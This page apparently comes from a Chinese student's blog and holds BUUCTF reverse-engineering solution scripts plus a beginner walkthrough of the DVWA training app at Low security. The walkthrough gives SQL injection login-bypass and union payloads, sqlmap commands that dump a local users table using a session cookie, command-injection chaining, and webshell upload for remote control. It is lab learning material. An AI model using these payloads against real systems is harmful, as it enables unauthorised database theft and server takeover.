<h3 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h3><p>pyc反编译py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [</span><br><span class="line">    <span class="string">&#x27;\x1f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x06&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x14&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;:&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x13&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;Welcome to Re World!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;Your input1 is your flag~&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = [</span><br><span class="line">    <span class="string">&#x27;\x1f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x06&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x14&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;:&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)-<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    code[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(code[i])^<span class="built_in">ord</span>(code[i+<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">    print(<span class="built_in">chr</span>((<span class="built_in">ord</span>(code[i])-i)%<span class="number">128</span>),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><p>wp参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ao52426055/article/details/110221943">(13条消息) buu RSA_ao52426055的博客-CSDN博客</a></p>
<p>大素数分解网站：<a target="_blank" rel="noopener" href="http://www.factordb.com/">http://www.factordb.com</a></p>
<p>发现pubkey：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+</span><br><span class="line">&#x2F;AvKr1rzQczdAgMBAAE&#x3D;</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
<p>公钥解析</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20211028202454980.png" alt="image-20211028202454980"></p>
<p>分解n分别得到p，q，用rsatools解出密钥d</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20211028200230739.png" alt="image-20211028200230739"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">n= <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p= <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q= <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">d= <span class="number">81176168860169991027846870170527607562179635470395365333547868786951080991441</span></span><br><span class="line"></span><br><span class="line">key = rsa.PrivateKey(n,e,d,q,p)         <span class="comment">#在pkcs标准中,pkcs#1规定,私钥包含(n,e,d,p,q)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:\\ctf\\re\\buu\\41c4e672-98c5-43e5-adf4-49d75db307e4\\output\\flagenc.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:  <span class="comment">#以二进制读模式，读取密文</span></span><br><span class="line">    f = f.read()</span><br><span class="line">    print(rsa.decrypt(f,key))</span><br></pre></td></tr></table></figure>
<h3 id="ACTF-easyre"><a href="#ACTF-easyre" class="headerlink" title="ACTF easyre"></a>ACTF easyre</h3><p>先upx脱壳</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v4=<span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span></span><br><span class="line">key= <span class="string">&#x27;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(\&#x27;&amp;%$# !&quot;&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v4:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(key.find(i)+<span class="number">1</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://fallsilkworms.github.io/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="YX">
      <meta itemprop="description" content="等一场秋风再起，花开如绎">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fallsilkworm's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/" class="post-title-link" itemprop="url">dvwa初体验</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-05-21 19:45:09" itemprop="dateCreated datePublished" datetime="2021-05-21T19:45:09+08:00">2021-05-21</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-11-05 14:37:11" itemprop="dateModified" datetime="2021-11-05T14:37:11+08:00">2021-11-05</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>（主要只是对Low等级而言）</p>
<h1 id="Burp-Force"><a href="#Burp-Force" class="headerlink" title="Burp Force"></a>Burp Force</h1><p>解析：暴力破解用户名和密码</p>
<h2 id="方法1：bp爆破"><a href="#方法1：bp爆破" class="headerlink" title="方法1：bp爆破"></a>方法1：bp爆破</h2><p>最常规常见的方法，主要是运用bp抓包后发送到爆破模块用字典进行爆破即可</p>
<p>（找了个看起来很全的字典<a target="_blank" rel="noopener" href="https://github.com/arthur0081/Blasting_dictionary">GitHub - arthur0081/Blasting_dictionary: 爆破字典</a>）</p>
<p>这是破解方法所对应的一些适用条件：<img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210521201711.png" alt="QQ截图20210521201711"></p>
<p>low就很轻松爆出，新手狂喜</p>
<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210521204045.png" alt="QQ截图20210521204045"></p>
<h2 id="方法2：sql注入绕过"><a href="#方法2：sql注入绕过" class="headerlink" title="方法2：sql注入绕过"></a>方法2：sql注入绕过</h2><p>之后再看到其他博客才知道能这样爆，因为是自己了解sql注入太少所以不清楚能这样玩，毕竟sql注入我感觉挺难的。。应该是用在很多复杂的网站挖漏洞这种，而且sql注入漏洞应该是大赛中考虑最多的</p>
<p>这里再了解下定义吧：</p>
<p>  SQL注入即是指<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/2498090">web应用程序</a>对用户输入数据的合法性<strong>没有判断或过滤不严</strong>，攻击者可以在web应用程序中**事先定义好的查询语句的结尾上添加额外的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/SQL%E8%AF%AD%E5%8F%A5/5714895">SQL语句</a>**，在管理员不知情的情况下实现非法操作，以此来实现欺骗<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8/613818">数据库服务器</a>执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
<p>那首先就可以查看源码康康有没有过滤掉用户名和密码（因为没怎么学php语法然后sql语句也没记住太多所以确实看不太懂就是了）</p>
<p><code>&lt;?php</code></p>
<p><code>if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;   // 获取用户名和密码   $user = $_GET[ &#39;username&#39; ];</code></p>
<p>  <code>// Get password</code><br>  <code>$pass = $_GET[ &#39;password&#39; ];</code><br>  <code>$pass = md5( $pass );</code></p>
<p>  <code>// 查询验证用户名和密码</code><br>  <code>$query = &quot;SELECT * FROM users WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;</code><br>  <code>$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );</code></p>
<p>  <code>if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;</code><br>    <code>// 输出头像和用户名</code><br>    <code>$row  = mysqli_fetch_assoc( $result );</code><br>    <code>$avatar = $row[&quot;avatar&quot;];</code></p>
<p>​    <code>//登陆成功</code><br><code>​    echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;</code><br><code>​    echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</code><br>  <code>&#125;</code><br>  <code>else &#123;</code><br><code>​    // 登录失败</code><br><code>​    echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</code><br>  <code>&#125;</code></p>
<p>  <code>((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</code><br><code>&#125;</code></p>
<p><code>?&gt;</code></p>
<p>因为用户名和密码都没有进行过滤所以不安全，然后直接sql语句进行测试</p>
<p><code>admin’ or ‘1’=’1</code>，这个在数据库中对应<code>select * from *where username=’admin’ or ‘1’=’1’</code>语句，or语法是一真则真，因为’1’=’1’是恒成立的，where语句后面也就都为真，所以我们能够直接绕过验证，成功登录。</p>
<h3 id="顺便复习下GET和POST方法"><a href="#顺便复习下GET和POST方法" class="headerlink" title="顺便复习下GET和POST方法"></a>顺便复习下GET和POST方法</h3><h4 id="GET-方法"><a href="#GET-方法" class="headerlink" title="GET 方法"></a>GET 方法</h4><p><em>GET 用于从指定资源请求数据。</em></p>
<p><em>GET 是最常见的 HTTP 方法之一。</em></p>
<p>查询字符串（名称/值对）是在 GET 请求的 URL 中发送的</p>
<h4 id="POST-方法"><a href="#POST-方法" class="headerlink" title="POST 方法"></a>POST 方法</h4><p><em>POST 用于将数据发送到服务器来创建/更新资源。</em></p>
<p>通过 POST 发送到服务器的数据存储在 HTTP 请求的请求主体中</p>
<p>抓包后可以知道网站用的是GET或者是POST方法。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/others-articles/214882.html">菜鸡的渗透学习之路：DVWA暴力破解 - FreeBuf网络安全行业门户</a></p>
<h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><p>解析：命令行注入，通过输入恶意代码进行远程代码操控，即ctfhub里RCE模块（远程命令/代码执行漏洞）的题目。</p>
<p>首先了解一下ping：<strong>Ping是Windows、Unix和Linux系统下的一个命令。ping也属于一个通信协议，是TCP/IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。应用格式：ping空格IP地址</strong></p>
<p>这一块的内容还挺多的，也挺新：</p>
<p>命令的链接符号<br>1.每个命令之间用;隔开<br>说明：各命令的执行给果，不会影响其它命令的执行。换句话说，各个命令都会执行，但不保证每个命令都执行成功。<br>2.每个命令之间用&amp;&amp;隔开<br>说明：若前面的命令执行成功，才会去执行后面的命令。这样可以保证所有的命令执行完毕后，执行过程都是成功的。<br>3.每个命令之间用||隔开<br>说明：||是或的意思，只有前面的命令执行失败后才去执行下一条命令，直到执行成功一条命令为止。</p>
<ol start="4">
<li><p>| 是管道符号。管道符号改变标准输入的源或者是标准输出的目的地。</p>
</li>
<li><p>&amp; 是后台任务符号。 后台任务符号使shell在后台执行该任务，这样用户就可以立即得到一个提示符并继续其他工作。</p>
<p>基本的<strong>漏洞利用</strong>：window和linux系统都可以用&amp;&amp;来执行多条命令</p>
<p>所以这个题就直接按照题解，直接得到信息</p>
<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/image-20210521211237230.png" alt="image-20210521211237230"></p>
</li>
</ol>
<h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><p>解析：文件上传漏洞，是web安全中经常用到的一种漏洞形式。是对数据与代码分离原则的一种攻击。上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。主要是用一句话木马通过各种绕过上传到服务器然后用蚁剑连接即可拿到权限。</p>
<p>low等级很简单并无任何白名单黑名单</p>
<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210523200955.png" alt="QQ截图20210523200955"></p>
<p>直接传一句话木马用蚁剑连就行了</p>
<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210523201200.png" alt="QQ截图20210523201200"></p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>解析：跨域脚本攻击，向被攻击网站注入恶意脚本，恶意脚本获取到数据发送到另外一个域的网站上。XSS攻击需要具备两个条件：需要向web页面注入恶意代码；这些恶意代码能够被浏览器成功的执行。主要作用是拿到cookie</p>
<h2 id="XSS（Reflect）"><a href="#XSS（Reflect）" class="headerlink" title="XSS（Reflect）"></a>XSS（Reflect）</h2><p>反射型xss：基本原理就是通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特定的代码参数会被HTML解析和执行</p>
<p>虽然也不会，不过也得跟着看看源码：<img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210523202059.png" alt="QQ截图20210523202059"></p>
<p>只是判断了name是否为空，不为空就输出name。就存在xss漏洞</p>
<p>直接上xss测试语句<img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210523201706.png" alt="QQ截图20210523201706"></p>
<p>（很神奇）</p>
<h2 id="XSS（Store）"><a href="#XSS（Store）" class="headerlink" title="XSS（Store）"></a>XSS（Store）</h2><p>又是新东西，先了解下定义：储存型xss，把恶意脚本存储到被攻击者的网站的数据库。其他人访问数据库中的恶意脚本代码后，浏览器执行恶意脚本，被攻击。存储式攻击不止一次攻击，并且被攻击的人不止一个，影响范围大。</p>
<p>这个东西</p>
<p>大概思路就是说，攻击者在评论处输入xss测试语句,点击提交后这段脚本存入到数据库就能执行</p>
<p>然后又是跟着看源码的时候：</p>
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '' );
    //mysql_close();
}
?><p> </p>
<p>没有过滤掉message和name，直接在message处打上测试语句就行</p>
<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210523202903.png" alt="QQ截图20210523202903"></p>
<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210523203304.png" alt="QQ截图20210523203304"></p>
<p>（神奇）</p>
<h2 id="XSS（DOM）"><a href="#XSS（DOM）" class="headerlink" title="XSS（DOM）"></a>XSS（DOM）</h2><p>又是不知道的东西啊！了解下先：</p>
<p>DOM型XSS其实是一种特殊类型的反射型XSS，DOM是文档对象模型balbalbala那一堆东西我也不懂是啥，先不做过多的了解。。。</p>
<p>直接看着做</p>
<p>先看源码<?php# No protections, anything goes?>（好干净啥也没有？）</p>
<p>然后default也没过滤于是直接在url构造xss就行了</p>
<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210523204739.png" alt="QQ截图20210523204739"></p>
<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210523204801.png" alt="QQ截图20210523204801"></p>
<p>（有意思）</p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>解析：sql普通注入可以根据报错提示，进行sql语句注入从而直接爆出我们想要的信息，比如数据库版本、数据库名、用户名、操作系统版本等，一般用手注和sqlmap自动注。</p>
<h2 id="sqlmap自动注入（GET方法）"><a href="#sqlmap自动注入（GET方法）" class="headerlink" title="sqlmap自动注入（GET方法）"></a>sqlmap自动注入（GET方法）</h2><p>新手的我果然还是比较喜欢先尝试用工具嘻嘻</p>
<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210528193432.png" alt="QQ截图20210528193432"></p>
<p>got a 302 redirect to，，不能直接用，需要带上cookie，去抓包拿cookie，然后那就把cookie带上进行输入对应的sqlmap命令就能看到东西了，就是这么霸道。</p>
<p>基础命令如下：</p>
<p>*<em>-p参数只对指定的参数进行注入，在上述命令中指定了对username参数进行注入</em><br><em>-p username</em><br><em>-v：显示详细的信息，有1-6级，默认为1</em><br><em>-f参数查看指纹信息</em><br><em>–technique 看情况选</em><br><em>B : 基于Boolean的盲注（Boolean based blind）</em><br><em>Q : 内联查询（Inline queries）</em><br><em>T : 基于时间的盲注（time based blind）</em><br><em>U : 基于联合查询（Union query based）</em><br><em>E : 基于错误（error based）</em><br><em>S : 栈查询（stack queries）</em><br><em>–technique 看情况选******</em></p>
<p><u><strong><em>–dbs：查看目标数据库系统的所有库 -D</em></strong></u><br><u><strong><em>–tables     -T表名</em></strong></u><br><u><strong><em>–columns     -C字段名</em></strong></u><br><u>*<strong>–dump         内容**</strong></u></p>
<p>先看所有库 </p>
<p><code>python2 sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=m42j35b05uii73jgpe3am21he0&quot;  --dbs</code><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210528194000.png" alt="QQ截图20210528194000"></p>
<p>也可以看相应的表，这里查看了dvwa的表 </p>
<p><code>python2 sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=m42j35b05uii73jgpe3am21he0&quot;  --dbs -D dvwa --tables</code></p>
<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210528194217.png" alt="QQ截图20210528194217"></p>
<p>然后看users的字段和里面的内容</p>
<p> <code>python2 sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=m42j35b05uii73jgpe3am21he0&quot;  --dbs -D dvwa --tables users --columns --dump</code></p>
<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210528194823.png" alt="QQ截图20210528194823"></p>
<p>啥都能看到了！sql注入危害性可大。</p>
<h2 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h2><p>比较适用于所有的情况</p>
<p>还不熟悉sql语句，查看题解敲。</p>
<p>先起手式测试注入点：（联合查询注入）   <strong>1’ union select user, password from users#</strong></p>
<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210528200222.png" alt="QQ截图20210528200222"></p>
<p>然后闭合   <strong>1’ or ‘1’ =’1</strong> </p>
<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210528200405.png" alt="QQ截图20210528200405"></p>
<p>low等级毫无任何过滤直接成功注入，拿到所有信息，结束。</p>
<h1 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h1><p>解析：盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。难度比普通注入大很多。</p>
<p>类型大体分为布尔盲注，时间盲注，报错盲注</p>
<p>详情参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zane-s/articles/12371820.html#">SQL注入之盲注简单总结 - Zane_S - 博客园 (cnblogs.com)</a></p>
<h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>直接一套操作秒爆出表，sqlmap果真是相当厉害又方便  </p>
<p><code>python2 sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=m42j35b05uii73jgpe3am21he0&quot; --technique B  --dbs --batch</code> </p>
<p><img src="/2021/05/21/dvwa%E5%88%9D%E4%BD%93%E9%AA%8C/QQ%E6%88%AA%E5%9B%BE20210528202422.png" alt="QQ截图20210528202422"></p>
<p>这个爆的时候是一个表一个表的冒出来，符合盲注特点。</p>
<p>要查东西也和普通注入的时候一样的命令就行</p>
<h2 id="手动注入-1"><a href="#手动注入-1" class="headerlink" title="手动注入"></a>手动注入</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aedf919d08fb">DVWA-SQL Injection(Blind)(SQL盲注) - 简书 (jianshu.com)</a></p>
<p>一套按照题解可以搞出来。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


